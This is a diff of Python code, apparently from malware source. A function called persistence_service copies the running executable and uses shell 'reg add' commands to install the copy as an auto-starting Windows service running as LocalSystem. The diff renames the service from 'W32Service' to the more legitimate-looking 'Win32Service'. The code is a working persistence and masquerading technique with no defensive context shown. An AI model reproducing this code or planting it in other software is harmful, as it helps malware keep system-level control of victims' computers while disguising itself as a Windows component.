@@ -185,20 +185,20 @@ def persistence_service(_pers_loc):
     if not os.path.exists(_pers_loc):
         create_dir(_pers_loc)
         shutil.copyfile(sys.executable, _pers_loc)
-        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Service', shell=True)
-        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Service '
+        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Win32Service', shell=True)
+        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Win32Service '
                         '/v ImagePath /t REG_EXPAND_SZ /d "' + _pers_loc + '"', shell=True)
-        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Service '
+        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Win32Service '
                         '/v Type /t REG_DWORD /d 16', shell=True)
-        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Service '
+        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Win32Service '
                         '/v Start /t REG_DWORD /d 2', shell=True)
-        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Service '
+        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Win32Service '
                         '/v ErrorControl /t REG_DWORD /d 0', shell=True)
-        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Service '
+        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Win32Service '
                         '/v DisplayName /t REG_SZ /d "' + _pers_loc.split('\\')[-1] + '"', shell=True)
-        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Service '
+        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Win32Service '
                         '/v DependOnService /t REG_MULTI_SZ /d Tcpip', shell=True)
-        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Service '
+        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Win32Service '
                         '/v ObjectName /t REG_SZ /d LocalSystem', shell=True)
 
 
